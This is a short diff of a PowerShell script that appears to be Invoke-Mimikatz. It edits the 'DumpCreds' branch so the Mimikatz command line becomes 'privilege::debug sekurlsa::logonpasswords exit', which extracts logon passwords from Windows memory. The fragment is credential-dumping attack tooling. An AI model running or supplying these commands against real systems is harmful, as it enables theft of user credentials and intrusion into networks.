@@ -2719,7 +2719,7 @@ Function Main
 
 	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
 	{
-		$ExeArgs = "sekurlsa::logonpasswords exit"
+		$ExeArgs = "privilege::debug  sekurlsa::logonpasswords exit"
 	}
     elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
     {
